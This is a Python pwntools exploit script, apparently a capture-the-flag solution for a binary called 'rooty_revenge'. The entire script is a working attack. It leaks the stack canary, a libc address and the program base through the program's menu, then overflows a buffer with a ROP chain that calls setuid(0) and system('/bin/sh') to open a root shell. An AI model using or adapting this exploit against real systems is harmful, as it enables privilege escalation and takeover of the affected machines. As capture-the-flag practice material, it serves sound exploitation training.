from pwn import *

context.binary = binary = './rooty_revenge'

elf = ELF(binary)
rop = ROP(elf)

libc = elf.libc

# p = remote("127.0.0.1", 9901)
p = process()

padding = b'A'*488

p.recvuntil(b'You: ')
p.sendline(b'root')
p.sendline(b'root')
p.recvuntil(b'pass:')
p.recvuntil(b'Admin: ')
p.sendline(b'')
p.sendline(b'25')
line = p.recvline().strip().decode()
hex_value = line.split()[-1]
canary = int(hex_value, 16) 

log.info(f'Canary => {hex(canary)}')

p.sendline(b'')
p.recvuntil(b'Admin: ')
p.sendline(b'')
p.sendline(b'21')
line = p.recvline().strip().decode()
hex_value = line.split()[-1]
libc.address  = int(hex_value, 16) - 0x758ac

log.info(f'Libc base => {hex(libc.address)}')

p.sendline(b'')
p.recvuntil(b'Admin: ')
p.sendline(b'')
p.sendline(b'20')
p.recvuntil(b'Your pattern: ')
line = p.recvline().strip().decode()
hex_value = line.split()[-1]
elf.address  = int(hex_value, 16) - 0x3d50

log.info(f'ELF base => {hex(elf.address)}')

ret = elf.address + 0x1016
pop_rdi = libc.address + 0x28215

p.sendline(b'')
p.sendline(b'exit')
p.recvuntil(b'You: ')
p.sendline(b'root')

payload = padding
payload += p64(canary)
payload += b'a' * 8
payload += p64(pop_rdi)
payload += p64(0x0)
payload += p64(libc.symbols.setuid)
payload += p64(ret)

payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(ret)
payload += p64(libc.symbols.system)
p.sendline(payload)

p.interactive()


